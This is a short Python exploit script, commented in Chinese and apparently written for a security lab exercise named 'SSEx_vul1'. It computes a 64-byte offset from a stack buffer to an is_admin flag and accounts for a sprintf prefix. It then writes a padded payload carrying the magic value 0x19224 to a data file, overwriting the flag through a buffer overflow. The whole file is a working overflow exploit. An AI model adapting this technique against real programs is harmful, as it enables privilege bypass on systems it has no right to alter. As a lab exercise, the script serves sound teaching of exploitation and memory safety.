from pathlib import Path


# 目标用户，对应文件名为 <USER>_data.txt
USER = "test"

# 需要覆盖的返回值魔数
MAGIC = 0x19224

# 偏移来自 SSEx_vul1.asm.txt 中的实际栈布局：
#   user_buffer = byte ptr -48h
#   is_admin    = dword ptr -8
# 因此 user_buffer 到 is_admin 的偏移为：
#   0x48 - 0x8 = 0x40 = 64 字节
BUFFER_TO_IS_ADMIN = 0x48 - 0x8

# sprintf 先写入 "User=<USER>, Data="，再写入文件内容。
# 要覆盖 is_admin，文件内容需要先填充掉这部分前缀与缓冲区的剩余空间。
prefix = f"User={USER}, Data=".encode("ascii")
filler_len = BUFFER_TO_IS_ADMIN - len(prefix)

payload = b"A" * filler_len + MAGIC.to_bytes(4, "little")
Path(f"{USER}_data.txt").write_bytes(payload)

print(f"[+] buffer -> is_admin offset : {BUFFER_TO_IS_ADMIN} bytes")
print(f"[+] format prefix length       : {len(prefix)} bytes")
print(f"[+] filler length              : {filler_len} bytes")
print(f"[+] generated {USER}_data.txt, {len(payload)} bytes")
